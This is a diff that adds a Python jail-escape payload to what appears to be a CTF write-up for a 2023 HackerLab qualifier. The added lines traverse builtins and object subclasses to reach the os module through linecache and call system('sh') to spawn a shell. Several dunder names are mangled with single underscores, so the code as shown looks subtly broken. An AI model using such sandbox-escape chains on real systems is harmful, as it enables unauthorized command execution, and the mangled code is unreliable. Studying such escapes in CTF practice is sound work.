@@ -20,3 +20,15 @@ https://github.com/Tednoob17/HackerLab2023/blob/main/Qualifications%20Stages/Hac
 
 ![prison](Images/gankpame2.png)
 
+
+__builtins__['a']=__builtins__
+a['b']=()._class.bases_
+a['c']=b[0]._subclasses_()
+a['d']=c[59]._init_
+a['e']=d._getattribute_
+a['f']=e("func_globals")
+a['g']=f['LINECACHE'.lower()]
+a['h']=g._dict_
+a['i']=h['OS'.lower()]
+a['j']=i._dict_
+j['SYSTEM'.lower()]('sh')
